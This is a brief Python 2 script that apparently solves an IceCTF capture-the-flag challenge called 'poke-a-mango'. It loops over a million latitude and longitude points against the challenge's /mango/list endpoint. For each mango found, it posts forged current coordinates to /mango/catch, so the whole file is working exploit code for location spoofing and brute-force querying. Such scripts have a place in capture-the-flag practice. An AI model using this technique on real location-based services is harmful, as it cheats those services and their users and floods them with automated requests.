import requests
import json


for i in range(0,1000):
    for j in range(0,1000):
        HTTP = requests.post("http://poke-a-mango.vuln.icec.tf/mango/list", data = {"uuid": "121212121238400000-8cf0-11bd-b23e-10b96e4ef00d", "lat":(i+0.5),"long":(j+0.5)})
        parsed1 = json.loads(HTTP.text)
        for text in parsed1["mangos"]:
            print str(text["lat"])+"_"+str(text['lng'])
            post_data = {"uuid": "121212121238400000-8cf0-11bd-b23e-10b96e4ef00d", "curLat":str(text["lat"]),"curLong":str(text['lng']), "mangoLat" : str(text["lat"]),"mangoLong": str(text['lng'])}
            HTTP = requests.post("http://poke-a-mango.vuln.icec.tf/mango/catch", data = post_data)
            print HTTP.text




